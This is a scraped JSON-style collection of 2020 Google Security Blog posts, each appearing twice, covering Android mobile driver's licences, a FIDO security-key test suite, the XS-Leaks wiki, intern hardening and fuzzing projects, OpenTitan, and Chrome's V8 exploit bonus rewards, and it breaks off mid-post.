automatically validates the authenticity of the data transmitted by the mDL and refuses to display inauthentic data. This is far more secure than holograms and microprinting used in plastic cards where verification requires special training which most (human) verifiers don't receive. With most plastic cards, fake IDs are relatively easy to create, especially in an international context, putting everyone’s identity at risk.   The amount of data presented by the mDL is minimized — only data the user elects to release, either explicitly via prompts or implicitly via e.g. pre-approval and user settings, is released. This minimizes potential data abuse and increases the personal safety of users.For example, any bartender who checks your mDL for the sole purpose of verifying you’re old enough to buy a drink needs only a single piece of information which is whether the holder is e.g. older than 21, yes or no. Compared to the plastic card, this is a huge improvement; a plastic card shows all your data even if the verifier doesn’t need it.Additionally, all of this information is available via a 2D barcode on the back so if you use your plastic card driving license to buy beer, tobacco, or other restricted items at a store it’s common in some states for the cashier to scan your license. In some cases, this means you may get advertising in the mail but they may sell your identifying information to the highest bidder or, worst case, leak their whole database.      These are some of the reasons why we think mDL is a big win for end users in terms of privacy.   One commonality between plastic-card driving licences and the mDL is how the relying party verifies that the person presenting the license is the authorized holder. In both cases, the verifier manually compares the appearance of the individual against a portrait photo, either printed on the plastic or transmitted electronically and research has shown that it’s hard for individuals to match strangers to portrait images.   The initial version of ISO 18013-5 won’t improve on this but the ISO committee working on the standard is already investigating ways to utilize on-device biometrics sensors to perform this match in a secure and privacy-protecting way. The hope is that improved fidelity in the process helps reduce unauthorized use of identity documents.  mDL support in Android    Through facilities such as hardware-based Keystore, Android already offers excellent support for security and privacy-sensitive applications and in fact it’s already possible to implement the ISO 18013-5 standard on Android without further platform changes. Many organizations participating in the ISO committee have already implemented 18013-5 Android apps.   That said, with purpose-built support in the operating system it is possible to provide better security and privacy properties. Android 11 includes the Identity Credential APIs at the Framework level along with a Hardware Abstraction Layer interface which can be implemented by Android OEMs to enable identity credential support in Secure Hardware. Using the Identity Credential API, the Trusted Computing Base of mDL applications does not include the application or even Android itself. This will be particularly important for future versions where the verifier must trust the device to identify and authenticate the user, for example through fingerprint or face matching on the holder's own device. It’s likely such a solution will require certified hardware and/or software and certification is not practical if the TCB includes the hundreds of millions of lines of code in Android and the Linux kernel.   One advantage of plastic cards is that they don't require power or network communication to be useful. Putting all your licenses on your phone could seem inconvenient in cases where your device is low on battery, or does not have enough battery life to start. The Android Identity Credential HAL therefore provides support for a mode called Direct Access, where the license is still available through an NFC tap even when the phone's battery is too low to boot it up. Device makers can implement this mode, but it will require hardware support that will take several years to roll out.   For devices without the Identity Credential HAL, we have an Android Jetpack which implements the same API and works on nearly every Android device in the world (API level 24 or later). If the device has hardware-backed Identity Credential support then this Jetpack simply forwards calls to the platform API. Otherwise, an Android Keystore-backed implementation will be used. While the Android Keystore-backed implementation does not provide the same level of security and privacy, it is perfectly adequate for both holders and issuers in cases where all data is issuer-signed. Because of this, the Jetpack is the preferred way to use the Identity Credential APIs. We also made available sample open-source mDL and mDL Reader applications using the Identity Credential APIs.  Conclusion    Android now includes APIs for managing and presenting with identity documents in a more secure and privacy-focused way than was previously possible. These can be used to implement ISO 18013-5 mDLs but the APIs are generic enough to be usable for other kinds of electronic documents, from school ID or bonus program club cards to passports.   Additionally, the Android Security and Privacy team actively participates in the ISO committees where these standards are written and also works with civil liberties groups to ensure it has a positive impact on our end users.      ", "date": "October 28, 2020"},
{"website": "Google-Security", "title": "\nAnnouncing our open source security key test suite\n", "author": ["Posted by Fabian Kaczmarczyck, Software Engineer, Jean-Michel Picod, Software Engineer and Elie Bursztein, Security and Anti-abuse Research Lead"], "link": "https://security.googleblog.com/2020/11/announcing-our-open-source-security-key.html", "abstract": "                             Posted by Fabian Kaczmarczyck, Software Engineer, Jean-Michel Picod, Software Engineer and Elie Bursztein, Security and Anti-abuse Research Lead       Security keys and  your phone&#8217;s built-in security keys  are reshaping the way users authenticate online. These technologies are trusted by a growing number of websites to provide phishing-resistant two-factor authentication (2FA). To help make sure that next generation authentication protocols work seamlessly across the internet, we are committed to partnering with the ecosystem and providing essential technologies to advance state-of-the-art authentication for everyone. So, today we are releasing a new  open source security key test suite .&nbsp;           The protocol powering security keys                     Under the hood, roaming security keys are powered by the FIDO Alliance  CTAP protocols , the part of FIDO2 that ensures a seamless integration between your browser and security key. Whereas the security-key user experience aims to be straightforward, the CTAP protocols themselves are fairly complex. This is due to the broad range of authentication use cases the specification addresses: including websites, operating systems, and enterprise credentials. As the protocol specification continues to evolve&#8212;there is already a draft of CTAP 2.1&#8212;corner cases that can cause interoperability problems are bound to appear.         Building a test suite&nbsp;&nbsp;          We encountered many of those tricky corner cases while implementing our open-source security-key firmware  OpenSK  and decided to create a comprehensive test suite to ensure all our new firmware releases handle them correctly. Over the last two years, our test suite grew to include over 80 tests that cover all the CTAP2 features.         Strengthening the ecosystem&nbsp;         A major strength of the security key ecosystem is that the FIDO Alliance is an industry consortium with many participating vendors providing a wide range of distinct security keys catering to all users' needs.  The FIDO Alliance offers  testing  for conformance to the current specifications. Those tests are a prerequisite to passing the  interoperability tests  that are required for a security key to become FIDO Certified. Our test suite complements those official tools by covering additional scenarios and in-market corner cases that are outside the scope of the FIDO Alliance&#8217;s testing program.         Back in March 2020, we demonstrated our test suite to the FIDO Alliance members and offered to extend testing to all FIDO2 keys. We got an overwhelmingly positive response from the members and have been working with many security key vendors since then to help them make the best use of our test suite.         Overall, the initial round of the tests on several keys has yielded promising results and we are actively collaborating with many vendors on building on those results to improve future keys.         Open-sourcing our test suite&nbsp;         Today we are making  our test suite open source  to allow security key vendors to directly integrate it into their testing infrastructure and benefit from increased testing coverage. Moving forward, we are excited to keep collaborating with the FIDO Alliance, its members, the hardware security key industry and the open source community to extend our test suite to improve its coverage and make it a comprehensive tool that the community can rely on to ensure key interoperability. In the long term, it is our hope that strengthening the community testing capabilities will ultimately benefit all security key users by helping ensure they have a consistent experience no matter which security keys they are using.         Acknowledgements&nbsp;         We thank our collaborators: Adam Langley, Alexei Czeskis, Arnar Birgisson, Borbala Benko, Christiaan Brand, Dirk Balfanz, Guillaume Endignoux, Jeff Hodges, Julien Cretin, Mark Risher, Oxana Comanescu, Tadek Pietraszek and all the security key vendors that worked with us.                                     Posted by Fabian Kaczmarczyck, Software Engineer, Jean-Michel Picod, Software Engineer and Elie Bursztein, Security and Anti-abuse Research LeadSecurity keys and your phone’s built-in security keys are reshaping the way users authenticate online. These technologies are trusted by a growing number of websites to provide phishing-resistant two-factor authentication (2FA). To help make sure that next generation authentication protocols work seamlessly across the internet, we are committed to partnering with the ecosystem and providing essential technologies to advance state-of-the-art authentication for everyone. So, today we are releasing a new open source security key test suite. The protocol powering security keysUnder the hood, roaming security keys are powered by the FIDO Alliance CTAP protocols, the part of FIDO2 that ensures a seamless integration between your browser and security key. Whereas the security-key user experience aims to be straightforward, the CTAP protocols themselves are fairly complex. This is due to the broad range of authentication use cases the specification addresses: including websites, operating systems, and enterprise credentials. As the protocol specification continues to evolve—there is already a draft of CTAP 2.1—corner cases that can cause interoperability problems are bound to appear.Building a test suite  We encountered many of those tricky corner cases while implementing our open-source security-key firmware OpenSK and decided to create a comprehensive test suite to ensure all our new firmware releases handle them correctly. Over the last two years, our test suite grew to include over 80 tests that cover all the CTAP2 features.Strengthening the ecosystem A major strength of the security key ecosystem is that the FIDO Alliance is an industry consortium with many participating vendors providing a wide range of distinct security keys catering to all users' needs.  The FIDO Alliance offers testing for conformance to the current specifications. Those tests are a prerequisite to passing the interoperability tests that are required for a security key to become FIDO Certified. Our test suite complements those official tools by covering additional scenarios and in-market corner cases that are outside the scope of the FIDO Alliance’s testing program.Back in March 2020, we demonstrated our test suite to the FIDO Alliance members and offered to extend testing to all FIDO2 keys. We got an overwhelmingly positive response from the members and have been working with many security key vendors since then to help them make the best use of our test suite.Overall, the initial round of the tests on several keys has yielded promising results and we are actively collaborating with many vendors on building on those results to improve future keys.Open-sourcing our test suite Today we are making our test suite open source to allow security key vendors to directly integrate it into their testing infrastructure and benefit from increased testing coverage. Moving forward, we are excited to keep collaborating with the FIDO Alliance, its members, the hardware security key industry and the open source community to extend our test suite to improve its coverage and make it a comprehensive tool that the community can rely on to ensure key interoperability. In the long term, it is our hope that strengthening the community testing capabilities will ultimately benefit all security key users by helping ensure they have a consistent experience no matter which security keys they are using.Acknowledgements We thank our collaborators: Adam Langley, Alexei Czeskis, Arnar Birgisson, Borbala Benko, Christiaan Brand, Dirk Balfanz, Guillaume Endignoux, Jeff Hodges, Julien Cretin, Mark Risher, Oxana Comanescu, Tadek Pietraszek and all the security key vendors that worked with us.     ", "date": "November 13, 2020"},
{"website": "Google-Security", "title": "\nFostering research on new web security threats\n", "author": ["Posted by Artur Janc and terjanq, Information Security Engineers "], "link": "https://security.googleblog.com/2020/12/fostering-research-on-new-web-security.html", "abstract": "                             Posted by Artur Janc and terjanq, Information Security Engineers&nbsp;      The web is an ecosystem built on openness and composability.  It is an excellent platform for building capable applications, and it powers thousands of services created and maintained by engineers at Google that are depended on by billions of users. However, the web's open design also allows unrelated applications to sometimes interact with each other in ways which may undermine the platform's security guarantees.    Increasingly, security issues discovered in modern web applications hinge upon the misuse of long-standing web platform behaviors, allowing unsavory sites to reveal information about the user or their data in other web applications. This class of issues, broadly referred to as cross-site leaks (XS-Leaks), poses interesting challenges for security engineers and web browser developers due to a diversity of attacks and the complexity of building comprehensive defenses.     To promote a better understanding of these issues and protect the web from them, today marks the launch of the  XS-Leaks wiki &#8212;an open knowledge base to which the security community is invited to participate, and where researchers can share information about new attacks and defenses.     The XS-Leaks wiki&nbsp;      Available at  xsleaks.dev  ( code  on GitHub), the wiki explains the principles behind cross-site leaks, discusses common attacks, and proposes defense mechanisms aimed at mitigating these attacks. The wiki is composed of smaller articles that showcase the details of each cross-site leak, their implications, proof-of-concept code to help demonstrate the issue, and effective defenses.&nbsp;     To improve the state of web security, we're inviting the security community to work with us on expanding the XS-Leaks wiki with information about new offensive and defensive techniques.        Defenses&nbsp;      An important goal of the wiki is to help web developers understand the defense mechanisms offered by web browsers that can comprehensively protect their web applications from various kinds of cross-site leaks.&nbsp;     Each attack described in the wiki is accompanied by an overview of security features which can thwart or mitigate it; the wiki aims to provide actionable guidance to assist developers in the adoption of new browser security features such as  Fetch Metadata Request Headers ,  Cross-Origin Opener Policy ,  Cross-Origin Resource Policy , and  SameSite cookies .     The Security Team at Google has benefited from over a  decade  of productive collaboration with security experts and browser engineers to improve the security of the web platform. We hope this new resource encourages further research into creative attacks and robust defenses for a major class of web security threats. We're excited to work together with the community to continue making the web safer for all users.     Special thanks to Manuel Sousa for starting the wiki as part of his internship project at Google, and to the contributors to the  xsleaks  GitHub repository for their original research in this area.                                            Posted by Artur Janc and terjanq, Information Security Engineers The web is an ecosystem built on openness and composability.  It is an excellent platform for building capable applications, and it powers thousands of services created and maintained by engineers at Google that are depended on by billions of users. However, the web's open design also allows unrelated applications to sometimes interact with each other in ways which may undermine the platform's security guarantees.Increasingly, security issues discovered in modern web applications hinge upon the misuse of long-standing web platform behaviors, allowing unsavory sites to reveal information about the user or their data in other web applications. This class of issues, broadly referred to as cross-site leaks (XS-Leaks), poses interesting challenges for security engineers and web browser developers due to a diversity of attacks and the complexity of building comprehensive defenses.To promote a better understanding of these issues and protect the web from them, today marks the launch of the XS-Leaks wiki—an open knowledge base to which the security community is invited to participate, and where researchers can share information about new attacks and defenses.The XS-Leaks wiki Available at xsleaks.dev (code on GitHub), the wiki explains the principles behind cross-site leaks, discusses common attacks, and proposes defense mechanisms aimed at mitigating these attacks. The wiki is composed of smaller articles that showcase the details of each cross-site leak, their implications, proof-of-concept code to help demonstrate the issue, and effective defenses. To improve the state of web security, we're inviting the security community to work with us on expanding the XS-Leaks wiki with information about new offensive and defensive techniques.Defenses An important goal of the wiki is to help web developers understand the defense mechanisms offered by web browsers that can comprehensively protect their web applications from various kinds of cross-site leaks. Each attack described in the wiki is accompanied by an overview of security features which can thwart or mitigate it; the wiki aims to provide actionable guidance to assist developers in the adoption of new browser security features such as Fetch Metadata Request Headers, Cross-Origin Opener Policy, Cross-Origin Resource Policy, and SameSite cookies.The Security Team at Google has benefited from over a decade of productive collaboration with security experts and browser engineers to improve the security of the web platform. We hope this new resource encourages further research into creative attacks and robust defenses for a major class of web security threats. We're excited to work together with the community to continue making the web safer for all users.Special thanks to Manuel Sousa for starting the wiki as part of his internship project at Google, and to the contributors to the xsleaks GitHub repository for their original research in this area.       ", "date": "December 4, 2020"},
{"website": "Google-Security", "title": "\nImproving open source security during the Google summer internship program \n", "author": ["Posted by the Information Security Engineering team at Google "], "link": "https://security.googleblog.com/2020/12/improving-open-source-security-during.html", "abstract": "                             Posted by the Information Security Engineering team at Google&nbsp;      Every summer, Google&#8217;s Information Security Engineering (ISE) team  hosts a number of interns who work on impactful projects to help improve security at Google. This year was no different&#8212;well, actually it was a little bit different because internships went virtual. But our dedication to security was still front and center as our intern team worked on improvements in  open source software .    Open source software is the foundation of many modern software products. Over the years, developers increasingly have relied on reusable open source components for their applications. It is paramount that these open source components are secure and reliable.&nbsp;     The focus of  this year&#8217;s intern projects reflects ISE&#8217;s general approach of tackling security issues at scale, and can be split into three main areas:&nbsp;     Vulnerability research:  Finding new vulnerabilities, developing infrastructure to search for known bug classes at scale, and experimenting with new detection approaches.   Mitigation and hardening:  Developing hardening approaches with the goal of fully eliminating specific vulnerability classes or mitigating their impact.   Security education:  Sharing knowledge to increase awareness among developers and to help train security engineers.    Vulnerability research      Fuzzing is a highly effective method of uncovering memory-corruption vulnerabilities in C and C++ applications. With  OSS-Fuzz , Google provides a platform for fuzzing open source software. One of this year&#8217;s intern  projects  ported internal fuzz targets to OSS-Fuzz, which led to the discovery of new bugs. In this context, our interns experimented with setting up fuzzing for difficult fuzz targets such as the state machines of Memcached and Redis. Additionally, they added new fuzzers for complicated targets like  nginx ,  PostgreSQL , and  Envoy , a widely used cloud-native high-performance proxy.&nbsp;     State-of-the-art fuzzing frameworks like  AFL ,  libFuzzer , and  Honggfuzz  leverage feedback such as code coverage to guide the fuzzer. Recent academic papers suggest that symbolic execution can complement existing fuzzing frameworks to find bugs that are difficult for random mutation-based fuzzers to find. Our interns evaluated the possibility of using  KLEE  to augment libFuzzer and AFL. In particular, they found that adding KLEE to existing fuzzing frameworks provides benefits for fuzz targets such as sqlite and lcms. However, at this point in time, there is still work to be done before symbolic execution can be performed at scale (e.g., in  OSS-Fuzz ).     In addition to finding memory-corruption vulnerabilities, fuzzing can help find logic vulnerabilities. This can be difficult as it requires understanding the semantics of the target application. One approach uses differential testing to find different behaviors in applications that are supposed to behave in the same way. One of our intern projects this summer looked into leveraging differential fuzzing to expose logic vulnerabilities and found a number of cases where YAML parsers handle edge cases differently.     Other intern projects this summer focused on the search  for application-specific vulnerabilities. Our interns aimed to discover common  Google Kubernetes Engine  (GKE)  misconfigurations. The recently launched  GKE-Auditor , created by one of our interns, implements 18 detectors to find misconfigurations in Node isolation, role-based access control, and pod security policies. Another project implemented regression tests for the Google Compute Engine (GCE)  metadata server .&nbsp;     Finally, one intern project looked into improving Visual Studio Code (VSCode), a popular cross-platform code editor that is based on  Electron  which combines the Chromium rendering engine and the Node.js runtime. VSCode can be vulnerable to  DOM cross-site scripting  attacks. For this reason, our intern&#8217;s work centered  on making VSCode  Trusted Types -compliant by using and contributing to the  static  and  dynamic  analysis tools to find violations. This work not only led to an improvement of  VSCode , but also of  Chromium .       Hardening&nbsp;      Because finding all vulnerabilities is an impossible task, we always look for ways to mitigate their impact or eliminate certain vulnerability classes completely. The main focus of this year&#8217;s hardening projects were to enable security enhancements for major web frameworks and to provide sandboxing for popular libraries written in memory-unsafe languages such as C and C++.     In an effort to make the web more secure, our intern team added security enhancements including  Content Security Policy  (CSP),  Fetch Metadata Request Headers ,  Cross-Origin Opener Policy  (COOP), and  Cross-Origin Embedder Policy  (COEP) to a number of existing web frameworks (our  previous post  provides a good overview of these mitigations).     As a result, these web security features were implemented in a number of common application frameworks, including Apache Struts [ CSP ,  COOP/COEP ], Apache Wicket [ Fetch Metadata ,  COOP/COEP ], .NET Core [ CSP ], Django [ Trusted Types ,  COOP ], and WordPress [ Fetch Metadata ,  CSP ]. We're looking forward to working with open source maintainers to further develop and integrate these defenses into more popular frameworks!      Sandboxing&nbsp;      Executing native code that comes from untrusted origins or processes data from untrusted sources is risky because it may be malicious or contain vulnerabilities. Sandboxing mitigates these risks by executing code in a low-privileged environment.This process often requires modifying the interfaces of third-party libraries and setting up their execution environment.  Sandboxed API  is a framework to help with these tasks that is used at Google.&nbsp;     Our interns also worked on providing reusable sandboxes for  popular open source libraries  such as curl, OpenJPEG, LoadPNG, LibUV, and libTIFF. Now, anyone who wants to use these libraries to process untrusted data can do so safely.      Education      Capture the flag ( CTF ) competitions are useful for transferring security knowledge and training security engineers. The  kCTF  project provides a Kubernetes-based infrastructure which offers a hardened environment to securely deploy CTF tasks and isolate them from each other. One intern project added a  number of improvements  to the documentation including enabling a version control to allow multiple authors to work on one challenge and simplifing CTF&#8217;s usage.     We would like to thank all of our interns for their hard work this summer! For more information on the Google internship program and other student opportunities, check out  careers.google.com/students.                                     Posted by the Information Security Engineering team at Google Every summer, Google’s Information Security Engineering (ISE) team  hosts a number of interns who work on impactful projects to help improve security at Google. This year was no different—well, actually it was a little bit different because internships went virtual. But our dedication to security was still front and center as our intern team worked on improvements in open source software.Open source software is the foundation of many modern software products. Over the years, developers increasingly have relied on reusable open source components for their applications. It is paramount that these open source components are secure and reliable. The focus of  this year’s intern projects reflects ISE’s general approach of tackling security issues at scale, and can be split into three main areas: Vulnerability research: Finding new vulnerabilities, developing infrastructure to search for known bug classes at scale, and experimenting with new detection approaches.Mitigation and hardening: Developing hardening approaches with the goal of fully eliminating specific vulnerability classes or mitigating their impact.Security education: Sharing knowledge to increase awareness among developers and to help train security engineers.Vulnerability researchFuzzing is a highly effective method of uncovering memory-corruption vulnerabilities in C and C++ applications. With OSS-Fuzz, Google provides a platform for fuzzing open source software. One of this year’s intern projects ported internal fuzz targets to OSS-Fuzz, which led to the discovery of new bugs. In this context, our interns experimented with setting up fuzzing for difficult fuzz targets such as the state machines of Memcached and Redis. Additionally, they added new fuzzers for complicated targets like nginx, PostgreSQL, and Envoy, a widely used cloud-native high-performance proxy. State-of-the-art fuzzing frameworks like AFL, libFuzzer, and Honggfuzz leverage feedback such as code coverage to guide the fuzzer. Recent academic papers suggest that symbolic execution can complement existing fuzzing frameworks to find bugs that are difficult for random mutation-based fuzzers to find. Our interns evaluated the possibility of using KLEE to augment libFuzzer and AFL. In particular, they found that adding KLEE to existing fuzzing frameworks provides benefits for fuzz targets such as sqlite and lcms. However, at this point in time, there is still work to be done before symbolic execution can be performed at scale (e.g., in OSS-Fuzz).In addition to finding memory-corruption vulnerabilities, fuzzing can help find logic vulnerabilities. This can be difficult as it requires understanding the semantics of the target application. One approach uses differential testing to find different behaviors in applications that are supposed to behave in the same way. One of our intern projects this summer looked into leveraging differential fuzzing to expose logic vulnerabilities and found a number of cases where YAML parsers handle edge cases differently.Other intern projects this summer focused on the search  for application-specific vulnerabilities. Our interns aimed to discover common Google Kubernetes Engine (GKE)  misconfigurations. The recently launched GKE-Auditor, created by one of our interns, implements 18 detectors to find misconfigurations in Node isolation, role-based access control, and pod security policies. Another project implemented regression tests for the Google Compute Engine (GCE) metadata server. Finally, one intern project looked into improving Visual Studio Code (VSCode), a popular cross-platform code editor that is based on Electron which combines the Chromium rendering engine and the Node.js runtime. VSCode can be vulnerable to DOM cross-site scripting attacks. For this reason, our intern’s work centered  on making VSCode Trusted Types-compliant by using and contributing to the static and dynamic analysis tools to find violations. This work not only led to an improvement of VSCode, but also of Chromium.Hardening Because finding all vulnerabilities is an impossible task, we always look for ways to mitigate their impact or eliminate certain vulnerability classes completely. The main focus of this year’s hardening projects were to enable security enhancements for major web frameworks and to provide sandboxing for popular libraries written in memory-unsafe languages such as C and C++.In an effort to make the web more secure, our intern team added security enhancements including Content Security Policy (CSP), Fetch Metadata Request Headers, Cross-Origin Opener Policy (COOP), and Cross-Origin Embedder Policy (COEP) to a number of existing web frameworks (our previous post provides a good overview of these mitigations).As a result, these web security features were implemented in a number of common application frameworks, including Apache Struts [CSP, COOP/COEP], Apache Wicket [Fetch Metadata, COOP/COEP], .NET Core [CSP], Django [Trusted Types, COOP], and WordPress [Fetch Metadata, CSP]. We're looking forward to working with open source maintainers to further develop and integrate these defenses into more popular frameworks!Sandboxing Executing native code that comes from untrusted origins or processes data from untrusted sources is risky because it may be malicious or contain vulnerabilities. Sandboxing mitigates these risks by executing code in a low-privileged environment.This process often requires modifying the interfaces of third-party libraries and setting up their execution environment. Sandboxed API is a framework to help with these tasks that is used at Google. Our interns also worked on providing reusable sandboxes for popular open source libraries such as curl, OpenJPEG, LoadPNG, LibUV, and libTIFF. Now, anyone who wants to use these libraries to process untrusted data can do so safely.EducationCapture the flag (CTF) competitions are useful for transferring security knowledge and training security engineers. The kCTF project provides a Kubernetes-based infrastructure which offers a hardened environment to securely deploy CTF tasks and isolate them from each other. One intern project added a number of improvements to the documentation including enabling a version control to allow multiple authors to work on one challenge and simplifing CTF’s usage.We would like to thank all of our interns for their hard work this summer! For more information on the Google internship program and other student opportunities, check out careers.google.com/students.     ", "date": "December 7, 2020"},
{"website": "Google-Security", "title": "\nOpenTitan at One Year: the Open Source Journey to Secure Silicon\n", "author": ["Posted by Dominic Rizzo, OpenTitan Lead, Google "], "link": "https://security.googleblog.com/2020/12/opentitan-at-one-year-open-source.html", "abstract": "                             Posted by Dominic Rizzo, OpenTitan Lead, Google&nbsp;      During the past year,  OpenTitan  has grown tremendously as an open source project and is on track to provide transparent, trustworthy, and cost-free security to the broader silicon ecosystem. OpenTitan, the industry&#8217;s first open source silicon root of trust, has rapidly increased engineering contributions, added critical new partners, selected our first tapeout target, and published a comprehensive logical security model for the OpenTitan silicon, among other accomplishments.      OpenTitan by the Numbers&nbsp;      OpenTitan has doubled many metrics in the year since our public launch: in design size,  verification testing, software test suites, documentation, and unique collaborators at least. Crucially, this growth has been both in the  design verification  collateral required for high volume production-quality silicon, as well as the digital design itself, a first for any open source silicon project.   More than doubled the number of  commits  at launch: from 2,500 to over 6,100 (across  OpenTitan  and the  Ibex  RISC-V core sub-project).  Grew to over 141K lines of code (LOC) of System Verilog digital design and verification.  Added 13 new IP blocks to grow to a  total  to 29 distinct hardware units.  Implemented 14  Device Interface Functions  (DIFs) for a total 15 KLOC of C11 source code and 8 KLOC of test software.  Increased our design verification suite to over 66,000 lines of test code for all IP blocks.  Expanded  documentation  to over 35,000 lines of Markdown.  Accepted contributions from 52 new unique contributors, bringing our total to 100.  Increased community presence as shown by an aggregate of over 1,200 Github stars between OpenTitan and Ibex.          One year of OpenTitan and Ibex growth on GitHub: the total number of   commits   grew from 2,500 to over 6,100.        High quality development is one of  OpenTitan&#8217;s core principles . Besides our many  style guides , we require thorough documentation and design verification for each IP block. Each piece of hardware starts with  auto-generated documentation  to ensure consistency between documentation and design, along with extensive, progressively improving,  design verification  as it advances through the OpenTitan hardware  stages  to reach tapeout readiness.            One year of growth in   Design Verification  : from 30,000 to over 65,000 lines of testing source code. Each color represents design verification for an individual IP block.        Innovating for Open Silicon Development       Besides writing code, we have made significant advances in developing processes and security framework for high quality, secure open source silicon development. Design success is not just measured by the hardware, highly functional software and a firm contract between the two, with well-defined interfaces and well-understood behavior, play an important role.     OpenTitan&#8217;s hardware-software contract is realized by our  DIF  methodology, yet another way in which we ensure hardware IP quality. DIFs are a form of hardware-software co-design and the basis of our chip-level design verification testing infrastructure. Each OpenTitan IP block requires a  style guide -compliant DIF, and this year we implemented 14 DIFs for a total 15 KLOC of C11 source code and 8 KLOC of tests.     We also reached a major milestone by publishing an open  Security Model  for a silicon root of trust, an industry first. This comprehensive guidance demonstrates how OpenTitan provides the core security properties required of a secure root of trust. It covers  provisioning ,  secure boot ,  device identity , and  attestation , and our  ownership transfer  mechanism, among other topics.      Expanding the OpenTitan Ecosystem&nbsp;      Besides engineering effort and methodology development, the OpenTitan coalition added two new Steering Committee members in support of lowRISC as an open source not-for-profit organization.  Seagate , a leader in storage technology, and  Giesecke and Devrient Mobile Security , a major producer of certified secure systems. We also chartered our Technical Committee to steer technical development of the project. Technical Committee members are drawn from across our organizational and individual contributors, approving 9 technical RFCs and adding 11 new project committers this past year.&nbsp;     On the strength of the OpenTitan open source project&#8217;s engineering progress, we are excited to announce today that Nuvoton and Google are collaborating on the first discrete OpenTitan silicon product. Much like the Linux kernel is itself not a complete operating system, OpenTitan&#8217;s open source design must be instantiated in a larger, complete piece of silicon. We look forward to sharing more on the industry&#8217;s first open source root of trust silicon tapeout in the coming months.      Onward to 2021      OpenTitan&#8217;s future is bright, and as a project it fully demonstrates the potential for open source design to enable collaboration across disparate, geographically far flung teams and organizations, to enhance security through transparency, and enable innovation in the open. We could not do this without our committed project partners and supporters, to whom we owe all this progress: Giesecke and Devrient Mobile Security, Western Digital, Seagate, the lowRISC CIC, Nuvoton, ETH Zürich, and many independent contributors.     Interested in contributing to the industry's first open source silicon root of trust? Contact us  here .                                    Posted by Dominic Rizzo, OpenTitan Lead, Google During the past year, OpenTitan has grown tremendously as an open source project and is on track to provide transparent, trustworthy, and cost-free security to the broader silicon ecosystem. OpenTitan, the industry’s first open source silicon root of trust, has rapidly increased engineering contributions, added critical new partners, selected our first tapeout target, and published a comprehensive logical security model for the OpenTitan silicon, among other accomplishments. OpenTitan by the Numbers OpenTitan has doubled many metrics in the year since our public launch: in design size,  verification testing, software test suites, documentation, and unique collaborators at least. Crucially, this growth has been both in the design verification collateral required for high volume production-quality silicon, as well as the digital design itself, a first for any open source silicon project.More than doubled the number of commits at launch: from 2,500 to over 6,100 (across OpenTitan and the Ibex RISC-V core sub-project).Grew to over 141K lines of code (LOC) of System Verilog digital design and verification.Added 13 new IP blocks to grow to a total to 29 distinct hardware units.Implemented 14 Device Interface Functions (DIFs) for a total 15 KLOC of C11 source code and 8 KLOC of test software.Increased our design verification suite to over 66,000 lines of test code for all IP blocks.Expanded documentation to over 35,000 lines of Markdown.Accepted contributions from 52 new unique contributors, bringing our total to 100.Increased community presence as shown by an aggregate of over 1,200 Github stars between OpenTitan and Ibex.One year of OpenTitan and Ibex growth on GitHub: the total number of commits grew from 2,500 to over 6,100.High quality development is one of OpenTitan’s core principles. Besides our many style guides, we require thorough documentation and design verification for each IP block. Each piece of hardware starts with auto-generated documentation to ensure consistency between documentation and design, along with extensive, progressively improving, design verification as it advances through the OpenTitan hardware stages to reach tapeout readiness.One year of growth in Design Verification: from 30,000 to over 65,000 lines of testing source code. Each color represents design verification for an individual IP block.Innovating for Open Silicon DevelopmentBesides writing code, we have made significant advances in developing processes and security framework for high quality, secure open source silicon development. Design success is not just measured by the hardware, highly functional software and a firm contract between the two, with well-defined interfaces and well-understood behavior, play an important role.OpenTitan’s hardware-software contract is realized by our DIF methodology, yet another way in which we ensure hardware IP quality. DIFs are a form of hardware-software co-design and the basis of our chip-level design verification testing infrastructure. Each OpenTitan IP block requires a style guide-compliant DIF, and this year we implemented 14 DIFs for a total 15 KLOC of C11 source code and 8 KLOC of tests.We also reached a major milestone by publishing an open Security Model for a silicon root of trust, an industry first. This comprehensive guidance demonstrates how OpenTitan provides the core security properties required of a secure root of trust. It covers provisioning, secure boot, device identity, and attestation, and our ownership transfer mechanism, among other topics.Expanding the OpenTitan Ecosystem Besides engineering effort and methodology development, the OpenTitan coalition added two new Steering Committee members in support of lowRISC as an open source not-for-profit organization. Seagate, a leader in storage technology, and Giesecke and Devrient Mobile Security, a major producer of certified secure systems. We also chartered our Technical Committee to steer technical development of the project. Technical Committee members are drawn from across our organizational and individual contributors, approving 9 technical RFCs and adding 11 new project committers this past year. On the strength of the OpenTitan open source project’s engineering progress, we are excited to announce today that Nuvoton and Google are collaborating on the first discrete OpenTitan silicon product. Much like the Linux kernel is itself not a complete operating system, OpenTitan’s open source design must be instantiated in a larger, complete piece of silicon. We look forward to sharing more on the industry’s first open source root of trust silicon tapeout in the coming months.Onward to 2021OpenTitan’s future is bright, and as a project it fully demonstrates the potential for open source design to enable collaboration across disparate, geographically far flung teams and organizations, to enhance security through transparency, and enable innovation in the open. We could not do this without our committed project partners and supporters, to whom we owe all this progress: Giesecke and Devrient Mobile Security, Western Digital, Seagate, the lowRISC CIC, Nuvoton, ETH Zürich, and many independent contributors.Interested in contributing to the industry's first open source silicon root of trust? Contact us here.     ", "date": "December 7, 2020"},
{"website": "Google-Security", "title": "\nAnnouncing Bonus Rewards for V8 Exploits\n", "author": ["Posted by Martin Barbella, Chrome Vulnerability Rewards Panelist"], "link": "https://security.googleblog.com/2020/12/announcing-bonus-rewards-for-v8-exploits.html", "abstract": "                             Posted by Martin Barbella, Chrome Vulnerability Rewards Panelist    Starting today, the Chrome Vulnerability Rewards Program is offering a new bonus for reports which demonstrate exploitability in  V8 , Chrome&#8217;s JavaScript engine. We have historically had many great V8 bugs reported (thank you to all of our reporters!) but we'd like to know more about the exploitability of different V8 bug classes, and what mechanisms are effective to go from an initial bug to a full exploit. That's why we're offering this additional reward for bugs that show how a V8 vulnerability could be used as part of a real world attack.     In the past, exploits had to be fully functional to be rewarded at our highest tier,  high-quality report with functional exploit . Demonstration of how a bug might be exploited is one factor that the panel may use to determine that a report is  high-quality , our second highest tier, but we want to encourage more of this type of analysis. This information is very useful for us when planning future mitigations, making release decisions, and fixing bugs faster. We also know it requires a bit more effort for our reporters, and that effort should be rewarded. For the time being this only applies to V8 bugs, but we&#8217;re curious to see what our reporters come up with!     The full details are available on the  Chrome VRP rules page . At a high-level, we&#8217;re offering increased reward amounts, up to double, for qualifying V8 bugs.     The following table shows the updated reward amounts for reports qualifying for this new bonus. These new, higher values replace the normal reward. If a bug in V8 doesn&#8217;t fit into one of these categories, it may still qualify for an increased reward at the panel&#8217;s discretion.        [1] Baseline reports 